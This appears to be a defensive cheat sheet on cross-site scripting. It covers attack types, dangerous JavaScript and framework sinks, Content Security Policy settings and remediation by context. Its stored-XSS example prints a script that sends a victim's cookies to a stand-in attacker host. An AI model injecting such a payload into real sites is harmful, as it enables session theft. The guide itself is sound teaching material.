# 🔥 XSS — CROSS-SITE SCRIPTING GUIDE

═══════════════════════════════════════════════════════════════
               DEFINITION AND TYPES
═══════════════════════════════════════════════════════════════

XSS = Injection of malicious JavaScript code
      that executes in a victim's browser.

OWASP : A03:2021
CWE   : CWE-79

TYPE 1 — REFLECTED XSS
  Payload in request → response → immediate execution
  Vector : Malicious link sent to victim
  Example : GET /search?q=<script>alert(1)</script>

TYPE 2 — STORED XSS (most dangerous)
  Payload stored in DB → displayed to other users
  Vector : Comment, profile, message, page title
  Example : Comment with <script>document.location='evil.com?c='+document.cookie</script>

TYPE 3 — DOM XSS
  Payload manipulates DOM directly via JavaScript
  Vector : URL hash, postMessage, localStorage
  Example : document.getElementById('msg').innerHTML = location.hash

TYPE 4 — BLIND XSS
  Payload executed in an admin context invisible to attacker
  Vector : Support fields, admin logs, internal forms
  Tools  : XSS Hunter for detection

═══════════════════════════════════════════════════════════════
               PATTERNS TO DETECT
═══════════════════════════════════════════════════════════════

JAVASCRIPT DANGEROUS SINKS
  element.innerHTML = userInput
  element.outerHTML = userInput
  document.write(userInput)
  document.writeln(userInput)
  element.insertAdjacentHTML('afterbegin', userInput)
  eval(userInput)
  new Function(userInput)
  setTimeout(userInput)     // If string
  setInterval(userInput)    // If string
  location.href = userInput // Open redirect + XSS
  location = userInput
  location.assign(userInput)

VUE — DANGEROUS :
  v-html="userInput"        // Without sanitization

REACT — DANGEROUS :
  dangerouslySetInnerHTML={{ __html: userInput }}

ANGULAR — DANGEROUS :
  bypassSecurityTrustHtml(userInput)
  [innerHTML]="userInput"   // Angular sanitizes, but be careful

PHP/BLADE — DANGEROUS :
  {!! $userInput !!}
  <?= $userInput ?>
  echo $userInput

═══════════════════════════════════════════════════════════════
               CONTENT SECURITY POLICY (CSP)
═══════════════════════════════════════════════════════════════

CSP = Last line of defense against XSS.
Even if code is injected, CSP prevents its execution.

STRONG CSP (recommended)
  Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'nonce-{RANDOM_NONCE}';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self';
    connect-src 'self' https://api.yourapp.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
    upgrade-insecure-requests;

NONCE (for legitimate inline scripts)
  // Server side : generate a unique nonce per request
  const nonce = crypto.randomBytes(16).toString('base64')

  // In CSP header :
  script-src 'self' 'nonce-{NONCE}'

  // In HTML :
  <script nonce="{NONCE}">
    // Legitimate inline script
  </script>

COMMON CSP ERRORS
  ❌ unsafe-inline in script-src → CSP useless against XSS
  ❌ unsafe-eval in script-src  → eval() allowed
  ❌ * in default-src           → Too permissive
  ❌ data: in script-src        → XSS via data URI

TEST YOUR CSP :
  → https://csp-evaluator.withgoogle.com/
  → Mozilla Observatory : https://observatory.mozilla.org/

═══════════════════════════════════════════════════════════════
               REMEDIATION BY CONTEXT
═══════════════════════════════════════════════════════════════

HTML CONTEXT (between tags)
  ❌ <div>USERDATA</div>
  ✅ <div>{{ htmlspecialchars(userdata) }}</div>
  ✅ <div>{{ userdata }}</div>  (Vue, Angular, Blade auto-escape)
  ✅ <div>{userdata}</div>     (React auto-escape)

HTML ATTRIBUTE CONTEXT
  ❌ <div class="USERDATA">
  ✅ <div class="{{ attr(userdata) }}">
  Warning : Even a non-event attribute can be dangerous
  <div style="background: url(USERDATA)"> → XSS via url()

URL CONTEXT
  ❌ <a href="USERDATA">
  ✅ Validate that URL starts with http:// or https://
     and not with javascript: or data:

JAVASCRIPT CONTEXT
  ❌ <script>var x = 'USERDATA';</script>
  ✅ Use JSON.stringify() for JS values
  ✅ Or better : never inject data into JS
     Use API calls instead
